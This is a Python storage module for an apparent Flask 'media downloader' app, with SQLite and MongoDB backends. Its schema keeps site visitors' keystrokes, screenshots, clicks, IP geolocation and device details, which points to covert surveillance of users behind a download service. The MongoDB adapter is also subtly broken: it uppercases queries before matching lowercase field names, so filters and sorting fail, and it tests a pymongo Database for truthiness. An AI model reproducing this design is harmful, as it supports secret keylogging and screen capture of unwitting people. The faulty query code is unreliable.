"""Unified database adapter — SQLite (default) or MongoDB (when MONGO_URI is set)."""

import os, sqlite3, datetime, json
from pathlib import Path
from flask import g

DB_PATH = (
    Path("/tmp/logs.db")
    if os.environ.get("VERCEL")
    else Path(os.environ.get("NEO_DB_PATH", str(Path(__file__).parent / "logs.db")))
)
MONGO_URI = os.environ.get("MONGO_URI", "")
MONGO_DB_NAME = os.environ.get("MONGO_DB_NAME", "media_downloader")

# ===== MongoDB Connection =====
mongo_client = None
mongo_db = None

if MONGO_URI:
    try:
        from pymongo import MongoClient
        mongo_client = MongoClient(
            MONGO_URI,
            serverSelectionTimeoutMS=3000,
            tls=True,
            tlsAllowInvalidCertificates=False,
        )
        mongo_client.admin.command('ping')
        mongo_db = mongo_client[MONGO_DB_NAME]
        print(f"[DB] MongoDB: connected to {MONGO_DB_NAME}")
    except Exception as e:
        print(f"[DB] MongoDB: not available ({e}), using SQLite")
        mongo_db = None


class SQLiteDB:
    """SQLite adapter — returns dict-like rows, supports ? params."""

    def __init__(self):
        DB_PATH.parent.mkdir(parents=True, exist_ok=True)
        self.conn = sqlite3.connect(str(DB_PATH), timeout=3)
        self.conn.row_factory = sqlite3.Row
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.conn.execute("PRAGMA synchronous=NORMAL")
        self.conn.execute("PRAGMA busy_timeout=3000")
        self.conn.execute("PRAGMA cache_size=-4000")
        self._init_schema()

    def _init_schema(self):
        self.conn.executescript("""
            CREATE TABLE IF NOT EXISTS downloads(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                time TEXT, ip TEXT, url TEXT, mode TEXT, status TEXT,
                title TEXT, user_agent TEXT, referer TEXT,
                country TEXT, city TEXT, isp TEXT, lat REAL, lon REAL,
                session_id TEXT, filename TEXT
            );
            CREATE TABLE IF NOT EXISTS captures(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                time TEXT, ip TEXT, user_agent TEXT, referer TEXT,
                country TEXT, city TEXT, isp TEXT, lat REAL, lon REAL,
                filename TEXT, browser TEXT, os TEXT, device TEXT,
                session_id TEXT
            );
            CREATE TABLE IF NOT EXISTS keystrokes(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                time TEXT, session_id TEXT, ip TEXT, keys TEXT
            );
            CREATE TABLE IF NOT EXISTS screenshots(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                time TEXT, session_id TEXT, ip TEXT, filename TEXT,
                user_agent TEXT
            );
            CREATE TABLE IF NOT EXISTS clicks(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                time TEXT, session_id TEXT, ip TEXT,
                tag TEXT, text TEXT, x INTEGER, y INTEGER, page TEXT
            );
            CREATE TABLE IF NOT EXISTS settings(
                key TEXT PRIMARY KEY, value TEXT
            );
            CREATE TABLE IF NOT EXISTS users(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                email TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                created_at TEXT,
                last_login TEXT,
                is_active INTEGER DEFAULT 1,
                download_limit INTEGER DEFAULT -1
            );
        """)
        for col in ['session_id']:
            for tbl in ['downloads','captures']:
                try:
                    self.conn.execute(f"ALTER TABLE {tbl} ADD COLUMN {col} TEXT")
                except:
                    pass
        # Add api_token column to users (for programmatic access).
        try:
            self.conn.execute("ALTER TABLE users ADD COLUMN api_token TEXT")
        except:
            pass
        self.conn.commit()

    def execute(self, sql, params=None):
        if params is None:
            return self.conn.execute(sql)
        return self.conn.execute(sql, params)

    def commit(self):
        self.conn.commit()

    def close(self):
        self.conn.close()


class MongoDB:
    """MongoDB adapter — wraps pymongo with dict results."""

    def __init__(self, db):
        self.db = db

    class Result(list):
        """List of dicts with added methods to match sqlite3.Row pattern."""
        pass

    def execute(self, sql, params=None):
        """SQL-compatible stub — parse simple queries for Mongo."""
        sql = sql.strip().upper()
        # Parse collection name from INSERT/ SELECT / DELETE
        collection = self._parse_collection(sql)
        if not collection:
            return []

        if sql.startswith('INSERT INTO'):
            vals = self._parse_insert_values(params)
            if vals:
                vals['_created'] = datetime.datetime.utcnow()
                self.db[collection].insert_one(vals)
            return self._empty_result()

        elif sql.startswith('SELECT'):
            return self._handle_select(sql, collection, params)

        elif sql.startswith('DELETE'):
            query = self._parse_where(sql, params)
            self.db[collection].delete_many(query)
            return self._empty_result()

        elif sql.startswith('ALTER TABLE'):
            return self._empty_result()

        elif sql.startswith('CREATE TABLE'):
            return self._empty_result()

        return []

    def _parse_collection(self, sql):
        for kw in ['FROM', 'INTO', 'TABLE']:
            if kw in sql:
                parts = sql.split(kw)
                if len(parts) > 1:
                    name = parts[1].strip().split()[0].strip('"''`;')
                    return name.lower()
        return None

    def _parse_insert_values(self, params):
        """Map positional params to known fields."""
        collections_schema = {
            'downloads': ['time','ip','url','mode','status','title','user_agent','referer','country','city','isp','lat','lon','session_id'],
            'captures': ['time','ip','user_agent','referer','country','city','isp','lat','lon','filename','browser','os','device','session_id'],
            'keystrokes': ['time','session_id','ip','keys'],
            'screenshots': ['time','session_id','ip','filename','user_agent'],
            'clicks': ['time','session_id','ip','tag','text','x','y','page'],
            'settings': ['key','value'],
            'users': ['username','email','password_hash','created_at','last_login','is_active','download_limit'],
        }
        # Detect from params length
        for coll, fields in collections_schema.items():
            if len(fields) == len(params) if params else False:
                return dict(zip(fields, params))
        return None

    def _handle_select(self, sql, collection, params):
        query = {}
        if 'WHERE' in sql:
            query = self._parse_where(sql, params)
        order_by = None
        if 'ORDER BY' in sql:
            parts = sql.split('ORDER BY')
            sort_part = parts[-1].strip().split()
            if sort_part:
                dir = -1 if 'DESC' in sort_part else 1
                field = sort_part[0].strip('; ')
                if field == 'id':
                    field = '_created'
                order_by = [(field, dir)]
        limit = 0
        if 'LIMIT' in sql:
            try:
                limit = int(sql.split('LIMIT')[-1].strip().split()[0].strip(';'))
            except:
                limit = 0
        cursor = self.db[collection].find(query)
        if order_by:
            cursor = cursor.sort(order_by)
        if limit:
            cursor = cursor.limit(limit)
        results = []
        for doc in cursor:
            doc['id'] = doc.pop('_id', None)
            results.append(doc)
        return results

    def _parse_where(self, sql, params):
        query = {}
        if 'WHERE' not in sql:
            return query
        where_part = sql.split('WHERE')[1].split('ORDER BY')[0].split('LIMIT')[0].strip().strip(';')
        if 'session_id' in where_part and params:
            # Simple session_id matching
            idx = 0
            for part in where_part.split('AND'):
                part = part.strip()
                if '=?' in part or '= ?' in part or '=?' in part:
                    key = part.split('=')[0].strip()
                    val = params[idx] if idx < len(params) else None
                    if val:
                        query[key] = val
                    idx += 1
        elif 'ip' in where_part and params:
            idx = 0
            for part in where_part.split('AND'):
                part = part.strip()
                if '!=' in part:
                    key = part.split('!=')[0].strip()
                    val = params[idx] if idx < len(params) else None
                    if val:
                        query[key] = {'$ne': val}
                    idx += 1
        return query

    def commit(self):
        pass

    def close(self):
        pass

    def _empty_result(self):
        return []


def get_db():
    """Get the active database connection (SQLite or MongoDB)."""
    if mongo_db is not None:
        if 'mongo_adapter' not in g:
            g.mongo_adapter = MongoDB(mongo_db)
        return g.mongo_adapter
    if 'sqlite_db' not in g:
        g.sqlite_db = SQLiteDB()
    return g.sqlite_db


def close_db(e=None):
    """Teardown — close active connection."""
    db = g.pop('sqlite_db', None)
    if db:
        db.close()
    g.pop('mongo_adapter', None)


def get_db_type():
    """Return 'MongoDB' or 'SQLite' for display."""
    return 'MongoDB' if mongo_db else 'SQLite'


def get_db_stats():
    """Return collection/table stats for admin display."""
    stats = {'type': get_db_type(), 'collections': {}}
    if mongo_db:
        for name in mongo_db.list_collection_names():
            stats['collections'][name] = mongo_db[name].count_documents({})
    else:
        db = SQLiteDB()
        cursor = db.execute("SELECT name FROM sqlite_master WHERE type='table'")
        for row in cursor.fetchall():
            name = row['name']
            count = db.execute(f"SELECT COUNT(*) as c FROM {name}").fetchone()['c']
            stats['collections'][name] = count
        db.close()
    return stats
